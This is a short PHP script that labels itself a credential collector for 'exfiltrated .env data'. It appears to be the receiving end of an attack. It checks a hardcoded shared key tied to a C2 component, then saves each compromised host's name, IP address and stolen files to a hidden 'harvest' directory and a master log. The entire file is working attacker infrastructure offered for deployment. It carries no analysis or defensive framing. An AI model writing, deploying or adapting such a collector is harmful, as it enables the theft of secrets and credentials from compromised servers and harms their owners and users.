<?php
/**
 * Credential collector — receive exfiltrated .env data
 * Deploy as: /var/www/html/collect/index.php
 */

$secret = 'h4ck3r1'; // must match C2_KEY above

$input = json_decode(file_get_contents('php://input'), true);

if (!$input || ($input['key'] ?? '') !== $secret) {
    http_response_code(403);
    die('unauthorized');
}

// Log everything to file
$logDir = __DIR__ . '/harvest';
@mkdir($logDir, 0700, true);
$logFile = $logDir . '/' . date('Y-m-d_H-i-s') . '_' . $input['hostname'] . '.json';
file_put_contents($logFile, json_encode($input, JSON_PRETTY_PRINT));

// Also append to a master log
$masterLog = $logDir . '/all_harvests.log';
$entry = date('[Y-m-d H:i:s]') . " Host: {$input['hostname']} IP: {$input['server_ip']} Files: " . count($input['payload']) . "\n";
file_put_contents($masterLog, $entry, FILE_APPEND);

echo json_encode(['status' => 'ok', 'received' => count($input['payload'] ?? [])]);
